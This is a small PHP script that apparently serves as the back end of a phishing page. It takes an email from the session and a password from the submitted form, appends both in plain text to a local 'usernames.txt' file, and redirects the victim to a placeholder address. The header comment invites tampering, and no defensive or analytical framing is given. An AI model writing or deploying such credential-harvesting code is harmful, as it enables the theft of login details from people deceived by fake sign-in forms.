<?php # SINCE EVERYBODY ELSE SAYS DON'T EDIT/TAMPER WITH THIS, YOU CAN EDIT/TAMPER ALL YOU WANT #
			session_start();
			
			$email=$_SESSION["username"];
			$pass = $_POST["password"];
			
			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $email . " ]   " . " " . "[ PASSWORD: " . " " . $pass . " ]\n", FILE_APPEND);
  			header('Location: <REDIRECT>');
			exit();
			
			
			session_destroy();
			
?>
